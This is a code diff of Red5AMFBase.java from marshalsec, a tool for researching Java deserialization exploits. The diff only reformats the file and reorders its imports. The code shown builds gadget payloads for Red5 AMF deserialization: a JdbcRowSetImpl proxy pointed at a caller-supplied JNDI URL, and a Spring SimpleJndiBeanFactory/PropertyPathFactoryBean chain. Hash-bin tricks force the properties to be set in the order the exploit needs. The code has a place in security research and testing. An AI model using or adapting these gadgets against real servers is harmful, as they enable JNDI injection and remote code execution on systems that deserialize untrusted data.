@@ -23,33 +23,28 @@ SOFTWARE.
 package marshalsec;
 
 
-import java.util.Collections;
-import java.util.LinkedHashMap;
-import java.util.Map;
-
-import org.apache.mina.core.buffer.IoBuffer;
-import org.red5.io.amf.Input;
-import org.red5.io.object.Deserializer;
-import org.springframework.beans.factory.config.PropertyPathFactoryBean;
-import org.springframework.jndi.support.SimpleJndiBeanFactory;
-
 import com.sun.rowset.JdbcRowSetImpl;
-
 import flex.messaging.io.SerializationContext;
 import flex.messaging.io.amf.AbstractAmfInput;
 import marshalsec.gadgets.Args;
 import marshalsec.gadgets.JdbcRowSet;
 import marshalsec.gadgets.Primary;
 import marshalsec.util.Reflections;
+import org.apache.mina.core.buffer.IoBuffer;
+import org.red5.io.amf.Input;
+import org.red5.io.object.Deserializer;
+import org.springframework.beans.factory.config.PropertyPathFactoryBean;
+import org.springframework.jndi.support.SimpleJndiBeanFactory;
+
+import java.util.Collections;
+import java.util.LinkedHashMap;
+import java.util.Map;
 
 
 /**
- * 
- * 
  * Uses BlazeDS for output
- * 
- * @author mbechler
  *
+ * @author mbechler
  */
 public abstract class Red5AMFBase extends BlazeDSBase implements JdbcRowSet {
 
@@ -59,7 +54,7 @@ public abstract class Red5AMFBase extends BlazeDSBase implements JdbcRowSet {
      * @see marshalsec.BlazeDSBase#unmarshal(byte[])
      */
     @Override
-    public Object unmarshal ( byte[] data ) throws Exception {
+    public Object unmarshal(byte[] data) throws Exception {
         IoBuffer buf = IoBuffer.wrap(data);
         Input i = createInput(buf);
         return Deserializer.deserialize(i, Object.class);
@@ -70,22 +65,22 @@ public abstract class Red5AMFBase extends BlazeDSBase implements JdbcRowSet {
      * @param buf
      * @return
      */
-    protected abstract Input createInput ( IoBuffer buf );
+    protected abstract Input createInput(IoBuffer buf);
 
 
     @Override
-    @Args ( minArgs = 1, args = {
-        "jndiUrl"
+    @Args(minArgs = 1, args = {
+            "jndiUrl"
     }, defaultArgs = {
-        MarshallerBase.defaultJNDIUrl
-    } )
-    public Object makePropertyPathFactory ( UtilFactory uf, String[] args ) throws Exception {
-        String jndiUrl = args[ 0 ];
+            MarshallerBase.defaultJNDIUrl
+    })
+    public Object makePropertyPathFactory(UtilFactory uf, String[] args) throws Exception {
+        String jndiUrl = args[0];
         PropertyInjectingProxy bfproxy = new PropertyInjectingProxy(
-            new SimpleJndiBeanFactory(),
-            Collections.singletonMap("shareableResources", new String[] {
-                jndiUrl
-        }));
+                new SimpleJndiBeanFactory(),
+                Collections.singletonMap("shareableResources", new String[]{
+                        jndiUrl
+                }));
 
         // RED5 uses a regular HashMap to temporarily store the property values
         //
@@ -93,11 +88,11 @@ public abstract class Red5AMFBase extends BlazeDSBase implements JdbcRowSet {
         // have to make sure that they end up in bins matching that order
         Map<String, Object> values = new LinkedHashMap<>();
         int size = 16;
-        for ( ; size < Short.MAX_VALUE; size = size << 1 ) {
+        for (; size < Short.MAX_VALUE; size = size << 1) {
             long p = mapHash("propertyPath".hashCode() & 0xFFFFFFFFL) % size;
             long t = mapHash("targetBeanName".hashCode() & 0xFFFFFFFFL) % size;
             long b = mapHash("beanFactory".hashCode() & 0xFFFFFFFFL) % size;
-            if ( p <= b && t <= b ) {
+            if (p <= b && t <= b) {
                 System.err.println(String.format("propertyPath @ %d targetBeanName @ %d beanFactory @ %d with table size %d", p, t, b, size));
                 break;
             }
@@ -109,7 +104,7 @@ public abstract class Red5AMFBase extends BlazeDSBase implements JdbcRowSet {
 
         // this blows up the table to the desired size
         // keys must be distributed more or less evenly or the hash table won't expand to the desired size
-        for ( int j = 0; j < size / 2; j++ ) {
+        for (int j = 0; j < size / 2; j++) {
             values.put("" + j, "");
         }
 
@@ -119,27 +114,27 @@ public abstract class Red5AMFBase extends BlazeDSBase implements JdbcRowSet {
 
     @Override
     @Primary
-    @Args ( minArgs = 1, args = {
-        "jndiUrl"
+    @Args(minArgs = 1, args = {
+            "jndiUrl"
     }, defaultArgs = {
-        MarshallerBase.defaultJNDIUrl
-    } )
-    public Object makeJdbcRowSet ( UtilFactory uf, String[] args ) throws Exception {
+            MarshallerBase.defaultJNDIUrl
+    })
+    public Object makeJdbcRowSet(UtilFactory uf, String[] args) throws Exception {
         Map<String, Object> values = new LinkedHashMap<>();
         int size = 16;
 
         // see makePropertyPathFactory for the gritty details
-        for ( ; size < Short.MAX_VALUE; size = size << 1 ) {
+        for (; size < Short.MAX_VALUE; size = size << 1) {
             long d = mapHash("dataSourceName".hashCode() & 0xFFFFFFFFL) % size;
             long a = mapHash("autoCommit".hashCode() & 0xFFFFFFFFL) % size;
-            if ( d <= a ) {
+            if (d <= a) {
                 System.err.println(String.format("dataSourceName @ %d autoCommit @ %d with table size %d", d, a, size));
                 break;
             }
         }
-        values.put("dataSourceName", args[ 0 ]);
+        values.put("dataSourceName", args[0]);
         values.put("autoCommit", true);
-        for ( int j = 0; j < size / 2; j++ ) {
+        for (int j = 0; j < size / 2; j++) {
             values.put("" + j, "");
         }
         return new PropertyInjectingProxy(Reflections.createWithoutConstructor(JdbcRowSetImpl.class), values);
@@ -150,8 +145,8 @@ public abstract class Red5AMFBase extends BlazeDSBase implements JdbcRowSet {
      * @param l
      * @return
      */
-    private static long mapHash ( long l ) {
-        return ( l ^ ( l >>> 16 ) );
+    private static long mapHash(long l) {
+        return (l ^ (l >>> 16));
     }
 
 
@@ -161,7 +156,7 @@ public abstract class Red5AMFBase extends BlazeDSBase implements JdbcRowSet {
      * @see marshalsec.BlazeDSBase#createInput(flex.messaging.io.SerializationContext)
      */
     @Override
-    protected AbstractAmfInput createInput ( SerializationContext sc ) {
+    protected AbstractAmfInput createInput(SerializationContext sc) {
         return null;
     }
 
